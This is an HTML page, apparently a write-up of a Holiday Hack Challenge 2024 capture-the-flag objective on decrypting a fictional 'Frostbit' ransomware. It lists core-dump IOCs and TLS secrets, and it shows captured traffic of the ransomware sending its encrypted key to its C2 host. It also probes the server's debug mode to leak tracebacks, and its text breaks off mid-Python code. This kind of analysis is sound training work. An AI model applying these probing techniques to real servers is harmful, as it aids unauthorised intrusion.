<!DOCTYPE html>
<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.131.0">
    <meta name="generator" content="Relearn 7.1.1">
    <meta name="description" content="Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.
Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.">
    <meta name="author" content="Roger C.B. Johnsen">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Elf Frostbit Decrypt - HHC 2024">
    <meta name="twitter:description" content="Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.
Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.">
    <meta property="og:url" content="http://localhost:1313/act3/elf-frostbit-decrypt/index.html">
    <meta property="og:site_name" content="HHC 2024">
    <meta property="og:title" content="Elf Frostbit Decrypt - HHC 2024">
    <meta property="og:description" content="Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.
Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.">
    <meta property="og:locale" content="en_us">
    <meta property="og:type" content="article">
    <meta property="article:section" content="Act3">
    <meta property="article:published_time" content="2024-12-14T14:54:19+01:00">
    <meta property="article:modified_time" content="2024-12-14T14:54:19+01:00">
    <meta itemprop="name" content="Elf Frostbit Decrypt - HHC 2024">
    <meta itemprop="description" content="Objective Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.
Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.">
    <meta itemprop="datePublished" content="2024-12-14T14:54:19+01:00">
    <meta itemprop="dateModified" content="2024-12-14T14:54:19+01:00">
    <meta itemprop="wordCount" content="1026">
    <title>Elf Frostbit Decrypt - HHC 2024</title>
    <link href="/images/logo.png?1734945675" rel="icon" type="image/png">
    <link href="/css/fontawesome-all.min.css?1734945675" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1734945675" rel="stylesheet"></noscript>
    <link href="/css/nucleus.css?1734945675" rel="stylesheet">
    <link href="/css/auto-complete.css?1734945675" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1734945675" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar.min.css?1734945675" rel="stylesheet">
    <link href="/css/fonts.css?1734945675" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1734945675" rel="stylesheet"></noscript>
    <link href="/css/theme.css?1734945675" rel="stylesheet">
    <link href="/css/theme-christmas.css?1734945675" rel="stylesheet" id="R-variant-style">
    <link href="/css/chroma-relearn-light.css?1734945675" rel="stylesheet" id="R-variant-chroma-style">
    <link href="/css/print.css?1734945675" rel="stylesheet" media="print">
    <script src="/js/variant.js?1734945675"></script>
    <script>
      window.relearn = window.relearn || {};
      window.relearn.relBasePath='..\/..';
      window.relearn.relBaseUri='..\/..';
      window.relearn.absBaseUri='http:\/\/localhost:1313';
      window.relearn.disableAnchorCopy=false;
      window.relearn.disableAnchorScrolling=false;
      // variant stuff
      window.variants && variants.init( [ 'christmas' ] );
      // translations
      window.T_Copy_to_clipboard = `Copy to clipboard`;
      window.T_Copied_to_clipboard = `Copied to clipboard!`;
      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
      window.T_Reset_view = `Reset view`;
      window.T_View_reset = `View reset!`;
      window.T_No_results_found = `No results found for "{0}"`;
      window.T_N_results_found = `{1} results found for "{0}"`;
    </script>
  </head>
  <body class="mobile-support html" data-url="/act3/elf-frostbit-decrypt/index.html">
    <div id="R-body" class="default-animation">
      <div id="R-body-overlay"></div>
      <nav id="R-topbar">
        <div class="topbar-wrapper">
          <div class="topbar-sidebar-divider"></div>
          <div class="topbar-area topbar-area-start" data-area="start">
            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide"><button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button>
            </div>
            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
<nav class="TableOfContents">
  <ul>
    <li><a href="#objective">Objective</a></li>
    <li><a href="#hints">Hints</a></li>
    <li><a href="#iocs">IOC&rsquo;s</a>
      <ul>
        <li><a href="#iocs-from-frostbit_core_dump13">IOC&rsquo;s from frostbit_core_dump.13</a></li>
        <li><a href="#iocs-from-pcap">IOC&rsquo;s from PCAP</a></li>
        <li><a href="#osint">OSINT</a></li>
        <li><a href="#from-other-objectives">From other objectives</a></li>
      </ul>
    </li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#gold">Gold</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
              </div>
            </div>
          </div>
          <span class="topbar-breadcrumbs highlightable">
            Elf Frostbit Decrypt
          </span>
          <div class="topbar-area topbar-area-end" data-area="end">
            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
                  <div class="topbar-area topbar-area-more" data-area="more">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <div id="R-main-overlay"></div>
      <main id="R-body-inner" class="highlightable act3" tabindex="-1">
        <div class="flex-block-wrapper">
<article class="default">
  <header class="headline">
  </header>

<h1 id="elf-frostbit-decrypt">Elf Frostbit Decrypt</h1>

<h2 id="objective">Objective</h2>
<blockquote>
<p>Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.</p>
</blockquote>
<h2 id="hints">Hints</h2>
<table>
<thead>
<tr>
<th>From</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Dusty Giftwrap</td>
<td>There&rsquo;s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn&rsquo;t disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages.</td>
</tr>
<tr>
<td>Dusty Giftwrap</td>
<td>The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use.</td>
</tr>
<tr>
<td>Dusty Giftwrap</td>
<td>I&rsquo;m with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It&rsquo;s great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.</td>
</tr>
</tbody>
</table>
<h2 id="iocs">IOC&rsquo;s</h2>
<h3 id="iocs-from-frostbit_core_dump13">IOC&rsquo;s from frostbit_core_dump.13</h3>
<h4 id="endpoints">Endpoints</h4>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings frostbit_core_dump.13 | grep http
</span></span><span style="display:flex;"><span>    https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest<span style="color:#f92672">=</span>0081c004828085c081a0e424db82a0a0
</span></span><span style="display:flex;"><span>    https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
</span></span><span style="display:flex;"><span>    https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit</span></span></code></pre></div>
<h5 id="ransomware-note">Ransomware note</h5>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0</span></span></code></pre></div>
<p><a href="#R-image-304041f1dd7bf515c8f04932666c55d8" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-304041f1dd7bf515c8f04932666c55d8"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png"></a></p>
<p>Links in screenshot verified to not be working.</p>
<p>In addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a &ldquo;debug&rdquo; GET parameter equals to 1:</p>
<div class="highlight wrap-code"><pre tabindex="0"><code>https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0&amp;debug=1</code></pre></div>
<p><a href="#R-image-403c3a1deb683bb99c8e72fe45c1df7c" class="lightbox-link"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-403c3a1deb683bb99c8e72fe45c1df7c"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png"></a></p>
<p>Toying with various parameters gives different results, in this case removing one character from the digest:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \&#34;/app/frostbit/ransomware/static/FrostBiteHashlib.py\&#34;, line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n&#34;</span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<p>I notice a reference to a Python file I have found already using a Google Dork. Further, toying with the &ldquo;Fgcse2IEk5zg3BhQhlL&rdquo; part of the URL yields this error:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Status Id File Not Found&#34;</span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<p>And the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Invalid UUID Format&#34;</span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<h5 id="nonce">Nonce</h5>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        &#34;nonce&#34;: &#34;e998a50d979ee2d7&#34;
</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
<h5 id="invalid-api-path">Invalid API Path</h5>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        &#34;error&#34;: &#34;Invalid API Path&#34;
</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
<h4 id="encrypted-key-json">Encrypted key JSON</h4>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings frostbit_core_dump.13 -n <span style="color:#ae81ff">10</span> | grep -i nonce</span></span></code></pre></div>
<p>Output:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;encryptedkey&#34;</span>:<span style="color:#e6db74">&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;</span>,<span style="color:#f92672">&#34;nonce&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}</span></span></code></pre></div>
<h4 id="unspecified-iocs">Unspecified IOC&rsquo;s</h4>
<p>The following IOC&rsquo;s were collected using the following command:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings frostbit_core_dump.13 -n50</span></span></code></pre></div>
<h4 id="unrecognized-json-1">Unrecognized JSON 1</h4>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;digest&#34;</span>:<span style="color:#e6db74">&#34;10044402b080a8example202088819b8&#34;</span>,<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Key Set&#34;</span>,<span style="color:#f92672">&#34;statusid&#34;</span>:<span style="color:#e6db74">&#34;ZGTw7qlexampleQNiW&#34;</span>}
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;digest&#34;</span>:<span style="color:#e6db74">&#34;0081c004828085c081a0e424db82a0a0&#34;</span>,<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Key Set&#34;</span>,<span style="color:#f92672">&#34;statusid&#34;</span>:<span style="color:#e6db74">&#34;Fgcse2IEk5zg3BhQhlL&#34;</span>}</span></span></code></pre></div>
<h4 id="long-hex-text">Long HEX text</h4>
<div class="highlight wrap-code"><pre tabindex="0"><code class="language-hex" data-lang="hex">2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f</code></pre></div>
<h4 id="client-and-server-handshakes-and-secrets">Client and Server handshakes and secrets</h4>
<div class="highlight wrap-code"><pre tabindex="0"><code>CLIENT_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 95d29ae475a8cca66237ae742e80ef054694f1cac76005718eda63098ea1ed54
SERVER_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 60fad6da7c95990bbdaa9c642d8d7f9babb7da4017a709a00b899176ca431807
CLIENT_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 3a582c4fb15aa9f10aecdaa72ca7b73ae0dfdd8126dd64aa18b3ab80c3957331
SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 784b9c051b6ed71221f367cc790ac1b1c8dd70dd8690c69f01262745bf61cd78</code></pre></div>
<div class="box notices cstyle note">
  <div class="box-label">
    <i class="fa-fw fas fa-exclamation-circle"></i> Note
  </div>
  <div class="box-content">
<p>These values when put into a text file and referenced in &ldquo;(Pre)-Master-Secret log filename&rdquo;, will decode the TLS entries in the associated PCAP.</p>
  </div>
</div>
<h4 id="post-request-for-key">POST request for key</h4>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div>
<h3 id="iocs-from-pcap">IOC&rsquo;s from PCAP</h3>
<p>Once loaded the Client and Server handshakes and secrets, we can decrypt and follow the TLS stream in PCAP:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">api.frostbit.app</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Go-http-client/1.1</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Server: nginx/1.27.1
</span></span><span style="display:flex;"><span>Date: Fri, 20 Dec 2024 11:00:08 GMT
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>Content-Length: 29
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Strict-Transport-Security: max-age=31536000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;nonce&#34;:&#34;e998a50d979ee2d7&#34;}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1
</span></span><span style="display:flex;"><span>Host: api.frostbit.app
</span></span><span style="display:flex;"><span>User-Agent: Go-http-client/1.1
</span></span><span style="display:flex;"><span>Content-Length: 1070
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;encryptedkey&#34;:&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;,&#34;nonce&#34;:&#34;e998a50d979ee2d7&#34;}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Server: nginx/1.27.1
</span></span><span style="display:flex;"><span>Date: Fri, 20 Dec 2024 11:00:08 GMT
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>Content-Length: 98
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Strict-Transport-Security: max-age=31536000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;digest&#34;:&#34;0081c004828085c081a0e424db82a0a0&#34;,&#34;status&#34;:&#34;Key Set&#34;,&#34;statusid&#34;:&#34;Fgcse2IEk5zg3BhQhlL&#34;}</span></span></code></pre></div>
<h3 id="osint">OSINT</h3>
<p>Dorking on Google I found:</p>
<p><a href="#R-image-cb5f6b353bdf25e778b94160efe92c0c" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png" style=" height: auto; width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-cb5f6b353bdf25e778b94160efe92c0c"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png"></a></p>
<p>The content of the Python file is:</p>
<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> traceback
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Frostbyte128</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>file_bytes <span style="color:#f92672">=</span> file_bytes
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>filename_bytes <span style="color:#f92672">=</span> filename_bytes
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>filename_bytes_length <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>filename_bytes)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>nonce_bytes <span style="color:#f92672">=</span> nonce_bytes
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>nonce_bytes_length <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>nonce_bytes)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_length <span style="color:#f92672">=</span> hash_length
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_result <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_compute_hash()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_compute_hash</span>(self) <span style="color:#f92672">-&gt;</span> bytes:
</span></span><span style="display:flex;"><span>        hash_result <span style="color:#f92672">=</span> bytearray(self<span style="color:#f92672">.</span>hash_length)
</span></span><span style="display:flex;"><span>        count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(self<span style="color:#f92672">.</span>file_bytes)):
</span></span><span style="display:flex;"><span>            xrd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>file_bytes[i] <span style="color:#f92672">^</span> self<span style="color:#f92672">.</span>nonce_bytes[i <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>nonce_bytes_length]
</span></span><span style="display:flex;"><span>            hash_result[count <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>hash_length] <span style="color:#f92672">=</span> hash_result[count <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>hash_length] <span style="color:#f92672">^</span> xrd
</span></span><span style="display:flex;"><span>            count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(self<span style="color:#f92672">.</span>filename_bytes)):
</span></span><span style="display:flex;"><span>            count_mod <span style="color:#f92672">=</span> count <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>hash_length
</span></span><span style="display:flex;"><span>            count_filename_mod <span style="color:#f92672">=</span> count <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>filename_bytes_length
</span></span><span style="display:flex;"><span>            count_nonce_mod <span style="color:#f92672">=</span> count <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>nonce_bytes_length
